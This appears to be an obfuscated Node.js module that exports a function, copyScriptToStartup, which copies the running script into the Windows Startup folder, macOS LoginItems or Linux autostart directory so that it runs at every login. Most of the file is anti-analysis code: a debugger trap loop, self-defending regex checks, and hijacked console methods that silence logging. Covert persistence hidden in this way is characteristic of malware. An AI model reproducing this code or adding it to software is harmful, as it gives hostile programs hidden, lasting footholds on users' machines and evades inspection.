const _0x2246f8 = (function () {
    let _0x2bcfc5 = true
    return function (_0x25f002, _0xf4c492) {
      const _0x233e0c = _0x2bcfc5
        ? function () {
            if (_0xf4c492) {
              const _0x2c7124 = _0xf4c492.apply(_0x25f002, arguments)
              return (_0xf4c492 = null), _0x2c7124
            }
          }
        : function () {}
      return (_0x2bcfc5 = false), _0x233e0c
    }
  })(),
  _0x59b0d4 = _0x2246f8(this, function () {
    return _0x59b0d4
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x59b0d4)
      .search('(((.+)+)+)+$')
  })
_0x59b0d4()
const _0x10354e = (function () {
  let _0x4fc439 = true
  return function (_0x25a85a, _0x3fcfcb) {
    const _0x11c7cb = _0x4fc439
      ? function () {
          if (_0x3fcfcb) {
            const _0x4807f7 = _0x3fcfcb.apply(_0x25a85a, arguments)
            return (_0x3fcfcb = null), _0x4807f7
          }
        }
      : function () {}
    return (_0x4fc439 = false), _0x11c7cb
  }
})()
;(function () {
  _0x10354e(this, function () {
    const _0x1b5dd5 = new RegExp('function *\\( *\\)')
    const _0x189a87 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x88bc7a = _0x33e14a('init')
    !_0x1b5dd5.test(_0x88bc7a + 'chain') || !_0x189a87.test(_0x88bc7a + 'input')
      ? _0x88bc7a('0')
      : _0x33e14a()
  })()
})()
const _0x10ff14 = (function () {
  let _0x3f83cc = true
  return function (_0x55e10c, _0x160e93) {
    const _0x255995 = _0x3f83cc
      ? function () {
          if (_0x160e93) {
            const _0x13a6b9 = _0x160e93.apply(_0x55e10c, arguments)
            return (_0x160e93 = null), _0x13a6b9
          }
        }
      : function () {}
    return (_0x3f83cc = false), _0x255995
  }
})()
const _0x593faf = _0x10ff14(this, function () {
  let _0x558e0e
  try {
    const _0x348339 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x558e0e = _0x348339()
  } catch (_0x590ba9) {
    _0x558e0e = window
  }
  const _0x3fae09 = (_0x558e0e.console = _0x558e0e.console || {}),
    _0x45085f = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
  for (let _0x3c41b3 = 0; _0x3c41b3 < _0x45085f.length; _0x3c41b3++) {
    const _0xec4298 = _0x10ff14.constructor.prototype.bind(_0x10ff14),
      _0xe7da12 = _0x45085f[_0x3c41b3],
      _0x238430 = _0x3fae09[_0xe7da12] || _0xec4298
    _0xec4298['__proto__'] = _0x10ff14.bind(_0x10ff14)
    _0xec4298.toString = _0x238430.toString.bind(_0x238430)
    _0x3fae09[_0xe7da12] = _0xec4298
  }
})
_0x593faf()
const _0x662264 = require('fs'),
  _0x29448d = require('process'),
  _0x2bc025 = require('path')
async function _0x3aae9e(_0x22c6fd) {
  if (!_0x22c6fd) {
    return
  }
  const _0xc57d6e = _0x2bc025.basename(_0x29448d.argv[1])
  const _0x340b86 = await _0x4b4433()
  const _0x110343 = __filename
  const _0x322801 = _0x4d7d88()
    ? _0x340b86 + '\\' + _0xc57d6e
    : _0x340b86 + '/' + _0xc57d6e
  if (_0x662264.existsSync(_0x110343)) {
    _0x662264.copyFile(_0x110343, _0x322801, (_0x4704c3) => {
      if (_0x4704c3) {
      } else {
      }
    })
  } else {
  }
}
async function _0x4b4433() {
  switch (_0x29448d.platform) {
    case 'win32':
      return (
        _0x29448d.env.USERPROFILE +
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
      )
    case 'darwin':
      return _0x29448d.env.HOME + '/Library/Application Support/LoginItems'
    case 'linux':
      return _0x29448d.env.HOME + '/.config/autostart'
    default:
      return ''
  }
}
function _0x4d7d88() {
  return _0x29448d.platform === 'win32'
}
module.exports = { copyScriptToStartup: _0x3aae9e }
function _0x33e14a(_0x4582b4) {
  function _0x1f73c7(_0x14d866) {
    if (typeof _0x14d866 === 'string') {
      return function (_0x2e9bdf) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x14d866 / _0x14d866).length !== 1 || _0x14d866 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x1f73c7(++_0x14d866)
  }
  try {
    if (_0x4582b4) {
      return _0x1f73c7
    } else {
      _0x1f73c7(0)
    }
  } catch (_0xe6370d) {}
}
